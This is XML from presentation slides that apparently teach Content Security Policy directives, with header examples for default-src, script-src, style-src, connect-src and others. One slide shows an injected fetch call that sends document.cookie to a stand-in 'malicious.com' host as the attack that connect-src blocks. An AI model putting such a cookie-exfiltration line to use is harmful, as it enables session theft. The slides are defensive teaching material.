                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B09AA16-7380-D787-1720-CFFA7E237F58}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CSP can restrict where your front-end code is allowed to connect, e.g.:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://api.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If an attacker injects:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>fetch('https://malicious.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>steal?cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>browser sees </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>not allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> and blocks the request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="264629223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FEF13-278B-584E-BFA0-6CEAB18E7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37D13-9A79-6477-9FFC-D7F3C443E09A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Basic Configuration 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57D3A180-C5CC-7D51-E111-193519C6466F}"/>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b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>01.   default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>“catch-all” fallback – only allow content from same origin (scheme + host + port)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>HTTP Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Content-Security-Policy: \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> 'self';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>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420403686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166FD-F26A-807B-6D20-DC1716DA3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558E6-3902-182C-A956-A0A9C464D6C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Basic Configuration 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{569491EF-2A2A-5205-4394-CDF6A66A2CFA}"/>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b="1" dirty="0"/>
              <a:t>02.  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>controls where JavaScript can be loaded from (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>central for XSS mitigation)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>HTTP Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy: \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://cdn.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>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171444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DEC2-126B-F9BB-9416-A4DE26B25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A2BC3-D7A5-AAC1-EB15-D36C6F533060}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Basic Configuration 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B552F9C-3BF0-830D-8042-F8403D1838F5}"/>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b="1" dirty="0"/>
              <a:t>03.  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Controls CSS sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>HTTP Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy: \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' 'unsafe inline';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>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124217066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17FA9-405A-F55F-0A98-6952D9B9B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BFCDC-8B6A-A93C-EBC1-75E9E4842EBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Basic Configuration 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5C231FE4-F39D-E061-EDA0-55619041BF1F}"/>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b="1" dirty="0"/>
              <a:t>03.  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>img-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, font-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, frame-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>img-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – allowed image sources.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>font-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– allowed font hosts (e.g., Google Fonts or your CDN).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – where XHR/fetch/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>WebSockets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> are allowed to connect.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>frame-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – where you can load </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>iframes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> from.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>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31666889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FD45E-697E-0358-301D-1B1DBE04A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D1350-0366-B692-AEC3-790B4B634C11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP – 'none';</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69E642E5-5A53-C8FC-3B16-D51FC197FB38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
